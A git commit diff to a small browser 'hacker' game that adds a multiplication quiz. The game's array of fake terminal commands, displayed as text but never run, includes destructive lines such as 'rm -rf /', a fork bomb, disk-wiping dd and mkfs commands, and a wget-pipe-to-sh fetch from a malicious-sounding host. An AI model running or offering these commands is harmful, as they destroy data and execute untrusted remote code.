e8ce258ff2e0db58683f716f3474b2f896ce5fb5
Torinberger <torinberger@torinberger.com>
2018-06-12 08:45:11 +1000

    does what its meant to do

--- src/game.js
+++ src/game.js
@@ -1,6 +1,9 @@
 
 var commands = ["sudo rm -rf /", ":(){:|:&};:", "command > /dev/sda", "mv folder /dev/null", "wget malicious_source.com/rip -O- | sh", "mkfs.ext3 /dev/sda", "^foo^bar", "dd if=/dev/random of=/dev/sda", "tar cvf archive_name.tar dirname/", "tar xvf archive_name.tar", "grep -i 'the' demo_file", "find -iname 'MyCProgram.c'", "find ~ -empty", "ssh -l jsmith remotehost.example.com", "sed 's/.$//' filename", " awk '!($0 in array) { array[$0]; print }' temp"]
 
+var out1;
+var out2;
+
 function ranBetween(min, max) {
   return Math.round(Math.random() * (max - min) + min);
 }
@@ -11,15 +14,27 @@ function generateCommand() {
   return "<p class='command'><span class='user'>admin@hack-master</span><span class='white'>$</span> "+commands[ranBetween(0, commands.length-1)]+"</p>";
 }
 
+function populateOuts() {
+  out1 = ranBetween(1, 12);
+  out2 = ranBetween(1, 12);
+  $("#out1").html("<h1>" + out1 + "</h1>");
+  $("#out2").html("<h1>" + out2 + "</h1>");
+}
+
 $(document).ready(function () {
   $("#console-text").on("click", function () {
     $("#console-text").append(generateCommand());
     $("#console-text").animate({ scrollTop: $("#console-text")[0].scrollHeight - $("#console-text").height() }, 500);
+    populateOuts();
   });
 
   $(document).keypress(function(e) {
     if(e.which == 13 && $("#in1 > input:nth-child(1)").is(":focus") && $("#in1 > input:nth-child(1)").val() != "" && !isNaN($("#in1 > input:nth-child(1)").val())) {
-      alert('You pressed enter!');
+      if(Number($("#in1 > input:nth-child(1)").val()) == out1*out2) {
+        alert("You win!");
+      } else {
+        alert("You Loose!");
+      }
     }
   });
 });
